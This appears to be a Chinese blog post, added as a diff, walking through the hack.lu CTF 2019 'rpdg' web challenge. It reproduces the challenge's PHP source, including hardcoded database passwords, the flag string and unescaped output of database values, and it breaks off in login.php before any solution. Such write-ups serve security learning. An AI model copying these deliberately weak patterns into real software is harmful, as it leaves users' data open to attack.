@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言2019hack.luCTF的rpdg的环境搭建到解决的详细过程 0x01 rpdg目录的结构如下： app目录下： static目录下全部是静态文件就不分析了。 admin.php文件的内容如下：123456789101112&amp;lt;?phpsession_start();if (isset($_SESSION[&apos;username&apos;]) &amp;amp;&amp;amp; $_SESSION[&apos;usern">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019hack.luCTF的rpdg的环境的搭建到解决的详细过程">
+<meta property="og:url" content="http://yoursite.com/2020/01/06/2019hack-luCTF的rpdg的环境的搭建到解决的详细过程/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言2019hack.luCTF的rpdg的环境搭建到解决的详细过程 0x01 rpdg目录的结构如下： app目录下： static目录下全部是静态文件就不分析了。 admin.php文件的内容如下：123456789101112&amp;lt;?phpsession_start();if (isset($_SESSION[&apos;username&apos;]) &amp;amp;&amp;amp; $_SESSION[&apos;usern">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-rpdg-1.PNG">
+<meta property="og:updated_time" content="2020-01-06T07:32:20.166Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019hack.luCTF的rpdg的环境的搭建到解决的详细过程">
+<meta name="twitter:description" content="前言2019hack.luCTF的rpdg的环境搭建到解决的详细过程 0x01 rpdg目录的结构如下： app目录下： static目录下全部是静态文件就不分析了。 admin.php文件的内容如下：123456789101112&amp;lt;?phpsession_start();if (isset($_SESSION[&apos;username&apos;]) &amp;amp;&amp;amp; $_SESSION[&apos;usern">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-rpdg-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/06/2019hack-luCTF的rpdg的环境的搭建到解决的详细过程/">
+
+
+
+
+
+  <title>2019hack.luCTF的rpdg的环境的搭建到解决的详细过程 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/06/2019hack-luCTF的rpdg的环境的搭建到解决的详细过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019hack.luCTF的rpdg的环境的搭建到解决的详细过程</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-06T15:30:59+08:00">
+                2020-01-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php-web/" itemprop="url" rel="index">
+                    <span itemprop="name">php-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2019hack.luCTF的rpdg的环境搭建到解决的详细过程</p>
+<h5 id="0x01-rpdg"><a href="#0x01-rpdg" class="headerlink" title="0x01 rpdg"></a>0x01 rpdg</h5><h6 id="目录的结构如下："><a href="#目录的结构如下：" class="headerlink" title="目录的结构如下："></a>目录的结构如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-rpdg-1.PNG" alt></p>
+<h6 id="app目录下："><a href="#app目录下：" class="headerlink" title="app目录下："></a><code>app</code>目录下：</h6><ul>
+<li><code>static</code>目录下全部是静态文件就不分析了。</li>
+<li><code>admin.php</code>文件的内容如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) &amp;&amp; $_SESSION[<span class="string">'username'</span>] === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;GDPR_is_here_to_save_y'all&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">'HTTP/1.1 403 Forbidden'</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="3行开启session可以在页面间传递数据。"><a href="#3行开启session可以在页面间传递数据。" class="headerlink" title="3行开启session可以在页面间传递数据。"></a><code>3</code>行开启<code>session</code>可以在页面间传递数据。</h6><h6 id="5-10行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。"><a href="#5-10行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。" class="headerlink" title="5~10行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。"></a><code>5~10</code>行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。</h6><ul>
+<li><code>db.php</code>的内容如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">'db'</span>, <span class="string">'rpdg'</span>, <span class="string">'Luung4aithaiCh3aetho'</span>, <span class="string">'rpdg'</span>);</span><br><span class="line"><span class="keyword">if</span> (!$db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'db oof'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$db-&gt;set_charset(<span class="string">"utf8"</span>)) &#123;</span><br><span class="line">    error_log(<span class="string">"db charset oof: "</span>.$db-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="3-10行是设置连接数据库的句柄，并且设置数据库的字符集。"><a href="#3-10行是设置连接数据库的句柄，并且设置数据库的字符集。" class="headerlink" title="3~10行是设置连接数据库的句柄，并且设置数据库的字符集。"></a><code>3~10</code>行是设置连接数据库的句柄，并且设置数据库的字符集。</h6><ul>
+<li><code>Dockerfile</code>的内容如下：<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.3</span>-fpm-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> docker-php-ext-install mysqli \</span></span><br><span class="line"><span class="bash">    &amp;&amp; docker-php-ext-enable mysqli</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="就是下载mysqli的扩展。"><a href="#就是下载mysqli的扩展。" class="headerlink" title="就是下载mysqli的扩展。"></a>就是下载mysqli的扩展。</h6><ul>
+<li><p><code>favicon.ico</code>是一张图片。</p>
+</li>
+<li><p><code>index.php</code>的内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$result = $db-&gt;query(<span class="string">"SELECT * FROM `culture`"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">    error_log(<span class="string">'db oof: '</span>.$result);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'db oof'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;title&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">        &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">        &lt;link href=<span class="string">"static/style.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top"&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;a class="navbar-brand" href="#"&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/a&gt;</span><br><span class="line">                &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"&gt;</span><br><span class="line">                    &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;</span><br><span class="line">                &lt;/button&gt;</span><br><span class="line">                &lt;div class="collapse navbar-collapse" id="navbarResponsive"&gt;</span><br><span class="line">                    &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">                        &lt;li class="nav-item active"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="index.php"&gt;Home&lt;/a&gt;</span><br><span class="line">                            &lt;span class="sr-only"&gt;(current)&lt;/span&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="register.php"&gt;Register&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="login.php"&gt;Login&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row"&gt;</span><br><span class="line">                &lt;div class="col-lg-12 text-center"&gt;</span><br><span class="line">                    &lt;img id="logo" class="ma-3" src="static/logo.png"&gt;</span><br><span class="line">                    &lt;p class="lead"&gt;Besides beer, pretzels and cars, Germany also offers a wonderful internet culture. Enjoy!&lt;/p&gt;</span><br><span class="line">                    &lt;div class="container"&gt;</span><br><span class="line">                        &lt;div class="card-columns"&gt;</span><br><span class="line">                            <span class="meta">&lt;?php</span> <span class="keyword">while</span> ($row = $result-&gt;fetch_assoc()) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                            &lt;div class="card text-white bg-dark culture-item" data-title="&lt;?php echo $row['title']; ?&gt;"&gt;</span><br><span class="line">                                &lt;img class="card-img-top thumbnail" src="&lt;?php echo '//i3.ytimg.com/vi/'.substr($row['link'], -11).'/hqdefault.jpg'; ?&gt;" alt="Thumbnail"&gt;</span><br><span class="line">                                &lt;div class="card-body text-left"&gt;</span><br><span class="line">                                    &lt;h5 class="card-title"&gt;&lt;?php echo mb_convert_encoding($row['title'], 'utf-8'); ?&gt;&lt;/h5&gt;</span><br><span class="line">                                    &lt;p class="card-text"&gt;&lt;small&gt;&lt;?php echo $row['year'] ?&gt;&lt;/small&gt;&lt;/p&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                            <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script src=<span class="string">"static/jquery.slim.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">"static/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">"tracc.php"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            document.querySelectorAll(<span class="string">'.culture-item'</span>).<span class="keyword">forEach</span>(item =&gt; &#123;</span><br><span class="line">                item.onclick = () =&gt; &#123;</span><br><span class="line">                    window.open(`/open.php?title=$&#123;encodeURIComponent(btoa(item.dataset.title))&#125;`, <span class="string">'_blank'</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>login.php</code>的内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">'db'</span>, <span class="string">'rpdg-login'</span>, <span class="string">'muLuqueiL7hiekei7roo'</span>, <span class="string">'rpdg'</span>);</span><br><span class="line"><span class="keyword">if</span> (!$db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'db oof'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">    $pass = $_POST[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_string($user) || !is_string($pass)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $stmt = $db-&gt;prepare(<span class="string">'SELECT `pwhash` FROM `users` WHERE `name`=?'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$stmt) &#123;</span><br><span class="line">        error_log(<span class="string">'db oof: '</span>.$db-&gt;error);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'db oof'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'s'</span>, $user);</span><br><span class="line">    <span class="keyword">if</span> (!$stmt-&gt;execute()) &#123;</span><br><span class="line">        error_log(<span class="string">'db oof: '</span>.$db-&gt;error);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'db oof'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = $stmt-&gt;get_result();</span><br><span class="line">    <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $hash = $row[<span class="string">'pwhash'</span>];</span><br><span class="line">    $valid = password_verify($pass, $hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($valid) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = $user;</span><br><span class="line"></span><br><span class="line">        header(<span class="string">'Location: /admin.php'</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'redirecting...'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $error_msg = <span class="string">'Your credentials are bad and you should feel bad!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;title&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">        &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top"&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;a class="navbar-brand" href="index.php"&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/a&gt;</span><br><span class="line">                &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"&gt;</span><br><span class="line">                    &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;</span><br><span class="line">                &lt;/button&gt;</span><br><span class="line">                &lt;div class="collapse navbar-collapse" id="navbarResponsive"&gt;</span><br><span class="line">                    &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="index.php"&gt;Home&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="register.php"&gt;Register&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item active"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="login.php"&gt;Login&lt;/a&gt;</span><br><span class="line">                            &lt;span class="sr-only"&gt;(current)&lt;/span&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row justify-content-center"&gt;</span><br><span class="line">                &lt;div class="col-lg-6"&gt;</span><br><span class="line">                    &lt;h1 class="mt-5"&gt;Login&lt;/h1&gt;</span><br><span 